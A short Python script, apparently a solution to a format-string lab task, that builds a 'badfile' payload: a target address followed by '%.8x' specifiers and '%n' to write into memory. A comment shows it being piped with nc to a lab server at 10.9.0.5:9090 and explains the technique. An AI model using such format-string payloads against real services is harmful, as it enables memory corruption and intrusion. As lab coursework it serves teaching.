#! /usr/bin/python3
import sys

def task(address, N):
    global content

    content[0:4] = (address).to_bytes(4, byteorder='little')

    s = "%.8x "*(N-1) + "%n\n"
    fmt = (s).encode('latin-1')
    content[4:4+len(fmt)] = fmt


N = 1500
content = bytearray(0x0 for i in range(N))

address = 0x080e5068

task(address, int(sys.argv[1]))

with open('badfile', 'wb') as f:
    f.write(content)

"""
./task3A.py 64; cat badfile | nc 10.9.0.5 9090

Symilar to task2B.py, we save the address of where we want to write in the first 4 cells
than with %n we write the number of characters written so far into the address we saved in the first 4 cells
"""